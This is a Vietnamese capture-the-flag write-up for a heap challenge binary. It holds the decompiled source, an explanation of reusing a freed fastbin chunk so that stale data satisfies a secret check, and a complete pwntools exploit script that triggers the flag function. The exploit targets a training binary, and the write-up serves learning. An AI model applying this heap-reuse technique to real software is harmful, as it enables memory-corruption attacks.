# Heap 1

## Source

<details> <summary> Source IDA </summary>

```c

__int64 catflag()
{
  int fd; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  fd = open("/home/uss/Desktop/flag", 0);
  if ( fd < 0 )
    printf("no flag file. Ask manager for help !");
  read(fd, buf, 0x64uLL);
  puts(buf);
  close(fd);
  return 1LL;
}

__int64 menu()
{
  puts("1: create heap");
  puts("2: delete heap");
  puts("3: exit");
  puts(">");
  return 0LL;
}

__int64 create()
{
  int i; // [rsp+8h] [rbp-18h]
  unsigned int size; // [rsp+Ch] [rbp-14h]
  _QWORD *size_4; // [rsp+10h] [rbp-10h]

  for ( i = 0; i <= 8 && *(&ptr + i); ++i )
    ;
  printf("Input size:");
  size = sub_400A53();
  if ( size > 0x1000 )
    exit(0);
  size_4 = malloc(0x10uLL);
  *size_4 = malloc(size);
  *(&ptr + i) = size_4;
  printf("Input data:");
  sub_4009E8(*size_4, size);
  return 0LL;
}

__int64 delete()
{
  int v1; // [rsp+4h] [rbp-Ch]
  void *ptr; // [rsp+8h] [rbp-8h]

  printf("Input index:");
  v1 = sub_400A53();
  if ( v1 >= 0xA )
    exit(0);
  if ( *(&::ptr + v1) )
  {
    ptr = **(&::ptr + v1);
    free(*(&::ptr + v1));
    free(ptr);
    **(&::ptr + v1) = 0LL;
    *(&::ptr + v1) = 0LL;
    puts("Done ");
  }
  return 0LL;
}


__int64 secret()
{
  if ( !secret_value )
    return 0LL;
  if ( *(secret_value + 8) == 0xABCDEFLL )
    catflag();
  return 0LL;
}

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  const char *v3; // rdi
  int v4; // eax

  init_0();
  v3 = "Ez heap challange !";
  puts("Ez heap challange !");
  while ( 1 )
  {
    while ( 1 )
    {
      menu(v3, a2);
      v4 = sub_400A53();    //hàm xử lí nhập
      if ( v4 != 2 )
        break;
      delete();
    }
    if ( v4 > 2 )
    {
      if ( v4 == 3 )
        exit(0);
      if ( v4 == 4 )
      {
        secret();
      }
      else
      {
LABEL_13:
        v3 = "no option";
        puts("no option");
      }
    }
    else
    {
      if ( v4 != 1 )
        goto LABEL_13;
      create();
    }
  }
}

```

</details>

## Ý tưởng

- Ở đây ta có hàm `catflag()` trong `secret()`, mục tiêu của ta là thoả mãn `if ( *(secret_value + 8) == 0xABCDEFLL )`, `secret_value` ở global, có vẻ nó lưu các địa chỉ heap.
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/61dedb22-814c-4c2f-b1a8-6bdfbdc19e1b)
- `secret_value` chỉ lưu các `heap 0x20` mà trong các heap đó chứa một địa chỉ heap khác là payload lúc ta `create`
- giá trị `*(secret_value + 8)` là chunk 0x20 thứ 3
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/26005c91-8d91-41ee-8056-f48c3f34e675)
- Vậy lỗ hổng ở cơ chế lưu chunk của tcache và fastbin (bài này là fastbin)
- tcache và fastbin lưu các chunk được free() theo dslk đơn (tương tư như stack), last in first out (vào sau - ra trước)
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/2a51bc25-12f6-48ff-b027-1918b891d543)
- Vậy ta có ý tưởng như này
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/030269ca-8226-4115-968e-85e44ab8d513)
- Vậy ta đã đổi chỗ 2 chunk nhưng dữ liệu khi free() không hề được xoá, nghĩa là nó chỉ đánh dấu chunk đó không sài nữa, và khi gọi lại, ta ghi đè lên dữ liệu cũ. Đồng nghĩa khi đổi chỗ 2 chunk thì `chunk secret` chứa dữ liệu của `chunk payload`. Và một lí thuyết là khi free thì free có vẻ chỉ ghi đè 0x0 vào 8 byte đầu.
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/fe0c54f1-3b57-4eeb-84b1-02c96936609c)
- Cho nên nếu ta đổi chỗ 2 chunk thì ta hoàn toàn set được giá trị của `*(secret_value + 8)`

## Khai thác

- Đầu tiên ta tạo 2 chunk, do `secret_value` lấy chunk thứ 3, 2 chunk đầu không liên quan lắm nên size, data nhập như nào cũng được

```python
create(b"40", b"0"*8)
create(b"40", b"1"*8)
```

- Tiếp theo chunk thứ 3 là chunk mà `secret_value` lấy nên ta sẽ tạo 1 chunk có size là 0x20, vì để có thể đổi chỗ 2 chunk như phần ý tưởng thì 2 chunk phải cùng kích thước thì khi lấy ra từ fastbin mới có thể đổi chỗ, nếu khác size thì khi lấy ra nó sẽ trở về địa chỉ cũ. Payload ta thử để kiểm tra kết quả.
- Tạo chunk 3 rồi free nó, sau đó lại `create`

```python
create(b"16", b"a" * 8 + b"b" * 8)
delete(2)
create(b"16", b"a")

```

- Sau khi free
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/55c0ccd8-4f8d-47a7-ba50-905eb601bf73)

- Sau khi create() lần 4
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/63ee7803-90d3-41f5-9b15-99ebd31e15d4)
- Kiểm tra `secret_value`
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/2bcbdbd5-eebc-44e2-a4b7-f7674c1c9373)
- Kiểm tra `*(secret_value + 8)`
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/6784a214-46db-49bc-8c93-5c4c7256d283)
- Vậy `*(secret_value + 8)` sẽ lấy 8 byte "b" của payload nên ta sẽ sửa payload

```python
create(b"40", b"0"*8)
create(b"40", b"1"*8)
create(b"16", b"a" * 8 + p64(0xABCDEF))
delete(b"2")
create(b"16", b"a")
sla(b">\n", b"4")
```

## Kết quả
- Do không có file flag =))
![image](https://github.com/wan-hyhty/trainning/assets/111769169/109962b1-e11f-4a91-a04f-31ff72bdf69b)
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('pwn1_ff_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x0000000000400cd4

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()


def create(size, payload):
    sla(b">\n", b"1")
    sla(b"size:", size)
    sa(b"data:", payload)


def delete(idx):
    sla(b">\n", b"2")
    sla(b"index:", idx)

create(b"40", b"0"*8)
create(b"40", b"1"*8)
create(b"16", b"a" * 8 + p64(0xABCDEF))
delete(b"2")
create(b"16", b"a")
sla(b">\n", b"4")


p.interactive()
```